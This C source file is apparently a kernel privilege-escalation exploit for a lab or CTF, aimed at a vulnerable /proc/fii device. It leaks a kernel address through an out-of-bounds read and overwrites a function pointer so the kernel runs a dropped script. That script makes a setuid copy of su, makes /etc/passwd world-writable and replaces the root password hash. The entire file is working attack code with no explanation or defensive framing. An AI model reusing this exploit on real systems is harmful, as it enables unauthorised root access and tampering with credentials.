#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdint.h>

void hexdump(uint8_t *ptr, size_t length) {
    for(int i = 0; i < length; i+=16) {
        printf("%08d\t", i);
        for(int j = 0; j < 16; j++) {
            if (i+j >= length) break;
            if (j % 2 == 0) {
                printf("%02hhx", ptr[i+j]);
            } else {
                printf("%02hhx ", ptr[i+j]);
            }
        }
        printf("\t");
        for(int j = 0; j < 16; j++) {
            if (i+j >= length) break;
            if (ptr[i+j] >= 0x20 && ptr[i+j] < 0x7f) {
                printf("%c", ptr[i+j]);
            } else {
                printf(".");
            }
        }
        printf("\n");
    }
}

int main() {
    int fd = open("/proc/fii", O_RDWR);
    if (fd == -1) {
        perror("Could not open the device!");
        return -1;
    }

    printf("[*] Reading the memory\n");
    uint8_t buffer[1024];
    read(fd, buffer, 264);
    hexdump(buffer, 264);
    printf("printk address: %lx\n", *(uint64_t *)(buffer + 256));
    uint64_t printk_address = *(uint64_t *)(buffer + 256);
    uint64_t run_cmd_address = printk_address - 0x30253;
    printf("[+] Leaked run_cmd function address 0x%lx\n", run_cmd_address);
    printf("[*] Making a copy of busybox to /tmp/su!\n");
    system("/bin/cp /bin/su /tmp/su");
    strcpy((char *)buffer, "/bin/sh /tmp/script.sh");
    *(uint64_t *)(buffer + 256) = run_cmd_address;
    
    FILE *f = fopen("/tmp/script.sh", "w");
    fprintf(f, "#!/bin/sh\n"
            "chown root /tmp/su\n"
            "chmod 7777 /tmp/su\n"
            "chmod 666 /etc/passwd\n"
            "sed 's/root:x:0:0:root:\\/root:\\/bin\\/sh/root:$1$i7XgAiIL$IbBegm53PrlZvS4N3vfNW0:0:0:root:\\/root:\\/bin\\/sh/g' /etc/passwd > /tmp/passwd\n"
            "mv /tmp/passwd /etc/passwd\n"
            "rm /tmp/script.sh"
    );
    fclose(f);
    
    printf("[+] Dropped script /tmp/script.sh\n");

    printf("[*] Executing the malicious script!\n");
    write(fd, buffer, 264);
    printf("[*] Done! Execute /tmp/su for the setuid binary with password 'x'!\n");

    return 0;
}
